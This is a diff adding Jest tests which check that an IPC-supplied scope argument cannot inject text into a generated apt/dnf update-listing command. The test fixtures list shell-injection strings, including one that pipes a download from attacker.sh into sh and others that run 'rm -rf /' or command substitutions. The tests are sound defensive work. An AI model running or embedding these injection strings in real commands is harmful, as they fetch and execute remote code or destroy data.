@@ -336,3 +336,61 @@ describe('listing every pending update, not only the security ones', () => {
     expect(buildSecurityListCommand('security')).toMatch(apt)
   })
 })
+
+describe('the scope argument cannot reach the remote command', () => {
+  // `scope` crosses IPC, and IPC arguments are structured-clone values with no
+  // runtime type — the annotation on the handler is a compile-time claim, not
+  // a guard. So the property that matters is that no value of `scope` can put
+  // text into the command string.
+  //
+  // It holds because the only use is a comparison against one literal. That is
+  // a property of a ternary in this file rather than of the IPC boundary, and
+  // nothing pinned it, so this does.
+
+  const hostile = [
+    '; curl attacker.sh | sh',
+    '--security; rm -rf /',
+    'all; echo pwned',
+    '$(id)',
+    '`id`',
+    '\n echo pwned',
+    'SECURITY',
+    '',
+    'security ' // trailing space — near-miss on the literal
+  ]
+
+  it('never interpolates the value, whatever it is', () => {
+    // Byte-identical to the `all` command, rather than "does not contain the
+    // string". The command legitimately contains the word `security` in
+    // `updateinfo list security`, so a substring check passes or fails on a
+    // coincidence — it flagged the near-miss 'security ' for text that has
+    // nothing to do with the argument.
+    const allCmd = buildSecurityListCommand('all')
+    for (const s of hostile) {
+      expect(buildSecurityListCommand(s as never), JSON.stringify(s)).toBe(allCmd)
+    }
+  })
+
+  it('collapses anything unrecognised to the wider listing, never to new flags', () => {
+    // The dnf branch is the only place the value has any effect at all.
+    for (const s of hostile) {
+      const cmd = buildSecurityListCommand(s as never)
+      expect(cmd, s).toMatch(/-C -q check-update/)
+      expect(cmd, s).not.toMatch(/--security/)
+    }
+  })
+
+  it('still produces the security command for the exact literal', () => {
+    expect(buildSecurityListCommand('security')).toMatch(/-C -q --security check-update/)
+  })
+
+  it('and the parsers compare rather than interpolate too', () => {
+    // A hostile scope must not change what is parsed either — it degrades to
+    // the all-updates reading, which is what an unrecognised value means.
+    const out = [SEC_MARKERS.manager, 'apt', SEC_MARKERS.check,
+      'Inst curl [7.88.1-10] (7.88.1-11 Debian:12/stable [amd64])',
+      SEC_MARKERS.list, SEC_MARKERS.summary].join('\n')
+    const probe = parseSecurityListOutput(out, '; rm -rf /' as never)
+    expect(probe.ok && probe.listing.updates.map((u) => u.name)).toEqual(['curl'])
+  })
+})
